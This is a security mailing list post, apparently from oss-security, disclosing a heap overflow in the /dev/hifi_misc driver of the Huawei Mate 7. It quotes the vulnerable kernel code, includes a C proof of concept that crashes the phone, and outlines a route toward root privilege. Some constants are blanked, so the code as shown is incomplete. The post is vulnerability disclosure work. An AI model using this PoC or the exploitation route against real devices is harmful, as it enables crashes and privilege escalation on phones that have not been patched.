  oss-security - Heap Overflow Vulnerability in the HIFI Driver  of Huawei Smart Phone            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Sat, 12 Dec From: Pray3r <pray3r.z@...il.com> To: oss-security@...ts.openwall.com Subject: Heap Overflow Vulnerability in the HIFI Driver  of Huawei Smart Phone  Hello everyone, 	One month ago, I was reported heap overflow vulnerability of Huawei smart to Huawei PSIRT, but they didn’t disclosure the detail of this vulnerability. So I’m sending the original version of the vulnerability advisory to sos-sec mailing list just for record[1]. 		   |=-----------------------------------------------------------------=| |=-----=[ D O   N O T   F U C K   W I T H   A   H A C K E R ]=-----=| |=-----------------------------------------------------------------=| |=------------------------[ #5 File ]-------------------------=| |=-----------------------------------------------------------------=| |=-------=[ Heap Overflow Vulnerability ]=----------=|   |=--------=[ in the HIFI Driver of Huawei Smart Phone ]=-----------=| |=-----------------------------------------------------------------=| |=-----------------------=[ By Pray3r   ]=-------------------------=| |=-----------------------------------------------------------------=| |=-----------------------------------------------------------------=| |=-----------------------=[ Dec 9 ]=--------------------------=| |=-----------------------------------------------------------------=|   --[ Content   Summary   Description   Impact   Affected   Patch   Timeline   --[ Summary    /dev/hifi_misc module of Huawei Mate 7 smart phone has an input   check error, which allows the user-mode application to modify   kernel-mode memory data and maybe make system break down or   application elevate privilege.   --[ Description    /dev/hifi_misc is an interface for a user-mode application to interact with kernel module of hisi chipset.  It is very likely that hifi_misc is related with hifi audio features.  Seen from drivers/hisi/hifidsp/hifi_lpp.c, one could send messages to hifi's kernel module by invoking ioctl() with HIFI_MISC_IOCTL_WRITE_PARAMS:  < drivers/hisi/hifidsp/hifi_lpp.c >  static long hifi_misc_ioctl(struct file *fd, unsigned int cmd, unsigned long arg) { [...] 	switch(cmd) { 		[...] 		case HIFI_MISC_IOCTL_WRITE_PARAMS : /* write algo param to hifi*/ 			ret = hifi_dsp_write_param(arg); 			break; 		[...] 	} [...] }  < / >    After ioctl(), hifi_dsp_write_param() is called with the parameter   directly passed from user-space:  < drivers/hisi/hifidsp/hifi_lpp.c >  int hifi_dsp_write_param(unsigned long arg) { 	int ret = OK; 	phys_addr_t hifi_param_phy_addr = 0; 	void*	    			hifi_param_vir_addr = NULL; 	CARM_HIFI_DYN_ADDR_SHARE_STRU* hifi_addr = NULL; 	struct misc_io_sync_param para; [...] 	if (copy_from_user(&para, (void*)arg, sizeof(struct misc_io_sync_param))) {  // arg --> para 	   loge("copy_from_user fail.\n"); 	   ret = ERROR; 	   goto error1; 	} [...] 	hifi_param_vir_addr = (unsigned char*)ioremap(hifi_param_phy_addr, SIZE_PARAM_PRIV); // heap alloc 	if (NULL == hifi_param_vir_addr) { 	   loge("hifi_param_vir_addr ioremap fail\n"); 	   ret = ERROR; 	   goto error2; 	} [...] 	ret = copy_from_user(hifi_param_vir_addr, para.para_in, para.para_size_in); // heap overflow 	if ( ret != 0) { 	   loge("copy data to hifi error! ret = %d", ret); 	   } [...] }  < / >    Parameter arg is a struct pointer points to user-space memory.   After initialization of hifi_dsp_write_param(), user-space memory   pointed by arg is copied to para via copy_from_user().  Without any   verification, all the member variables of para is fully controlled   by user-space application.  The struct of para:  struct misc_io_sync_param {        void *              para_in;                   unsigned int        para_size_in;               void *              para_out;                   unsigned int        para_size_out;    };  Next, a memory copy is invoked as copy_from_user(hifi_param_vir_addr,   para.para_in, para.para_size_in)     1. hifi_param_vir_addr points to a kernel heap block allocated by     ioremap(), regarded as the address of destination memory block.     The size of the this heap block is SIZE_PARAM_PRIV (equals to     * bytes.     2. para.para_in is a pointer controlled by user-space, regarded as  the address of original memory block.   3. para.para_size is an unsigned int controlled by user-space,  regarded as the size of original memory block.            Since there are not any verification of para_size and para_in, if   para.para_size is larger than say a typical heap   overflow is triggered.  The source code of our poc:  < poc.c > /*  *  *  HuaWei Mate7 hifi driver Poc  *  *  Writen by pray3r<pray3r.z@...il.com>  *  */  #include <stdio.h> #include <stdlib.h> #include <fcntl.h> #include <sys/types.h> #include <sys/stat.h> #include <sys/ioctl.h>  #define HIFI_MISC_IOCTL_WRITE_PARAMS    _IOWR('A', struct misc_io_sync_param)  struct misc_io_sync_param {        void *                  para_in;                    unsigned int            para_size_in;                void *                  para_out;                    unsigned int            para_size_out;     };  int main(int arg, char **argv) { 	int fd;   	void *in = * 	void *out = 	struct misc_io_sync_param poc;  	poc.para_in = in; 	poc.para_size_in = * 	poc.para_out = out; 	poc.para_size_out =  	fd = open("/dev/hifi_misc", O_RDWR);  	ioctl(fd, HIFI_MISC_IOCTL_WRITE_PARAMS, &poc);  	free(in); 	free(out);  	return 0; }  < / >    Execute the crash_poc will break down Huawei Mate 7.  Be aware that   the poc should be executed under system or audio privilege, since   /dev/hifi_misc is only writable to audio and system user.   --[ Impact      First, with a large value set to para.para_size, the smart phone   will break down because of heap overflow inside kernel space.   Second, this vulnerability could be used as a kernel information   disclosure if para.para_in points to kernel objects and the exploit   is wrapped with heap fengshui technique.  Third, sophisticated   exploitation methodology such as heap spray of thread_info published   by Keen Team, an attacker could build a workable exploit gaining the   root privilege of the smart phone.      Although /dev/hifi_misc is only writable to audio and system user,   an attacker may approach the root privilege by first gaining audio   or system privilege via other bugs or tricks then exploit this   kernel vulnerability to gain root.    Such two step exploitation methodology to gain root privilege of   Huawei Mate 7 is something that Keen Team had utilized before:      1.    2.   --[ Affected    Model   : HUAWEI   Version :   Android :   Kernel  :    Other models of Huawei smart phones with hisi chipset may also be   affected.   --[ Patch    More information:     --[ Timeline   Sep 28 - Report sent to Huawei PSIRT  Sep 10 - Huawei confirmed the security issues  Nov 04 - Huawei fixed and public the security issues  Nov 09 - Update CVE number  ---  Security is a bitch! Content of type "text/html" skipped  Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      